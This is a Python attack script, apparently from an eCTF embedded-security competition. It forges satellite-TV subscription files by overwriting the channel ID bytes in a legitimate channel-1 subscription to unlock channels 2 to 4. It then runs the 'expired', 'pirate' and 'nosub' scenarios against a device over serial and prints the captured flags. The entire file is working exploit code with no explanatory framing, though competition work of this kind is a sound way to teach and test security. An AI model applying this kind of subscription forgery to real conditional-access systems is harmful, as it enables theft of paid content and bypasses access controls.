#!/usr/bin/env python3
# for expired, pirate, nosub

import asyncio
import os
import sys

from loguru import logger

from attack_utils import LimitedAttackTV, conn, p32, run_attack

logger.remove()
logger.add(sys.stdout, level="INFO")


def forge_channel(subscription, channel, new_channel_id):
    channel_id, _, _ = channel
    offset = subscription.index(p32(channel_id))
    print(f"found offset {offset}")

    new_subscription = bytearray(subscription)
    new_subscription[offset : offset + 8] = p32(new_channel_id)

    return new_subscription


async def main():
    r = conn()
    listing = r.list()

    channel_1 = next(c for c in listing if c[0] == 1)

    with open("../test_out/own.sub", "rb") as f:
        channel_1_sub = f.read()

    try:
        await asyncio.wait_for(
            asyncio.to_thread(r.subscribe, forge_channel(channel_1_sub, channel_1, 2)), 5
        )
        await asyncio.wait_for(
            asyncio.to_thread(r.subscribe, forge_channel(channel_1_sub, channel_1, 3)), 5
        )
        await asyncio.wait_for(
            asyncio.to_thread(r.subscribe, forge_channel(channel_1_sub, channel_1, 4)), 5
        )
    except ValueError:
        print("couldn't find channel offset")
        return

    for channel, scenario in [(2, "expired"), (3, "pirate"), (4, "nosub")]:
        tv = LimitedAttackTV(
            os.environ["IP"],
            int(os.environ[f"CHANNEL_{channel}_PORT"]),
            "/dev/ttyACM0",
        )

        tv.run()

        if tv.flag:
            print(f"POTENTIAL FLAG: ectf{{{scenario}_{tv.flag}}}")


if __name__ == "__main__":
    run_attack(main, 30)
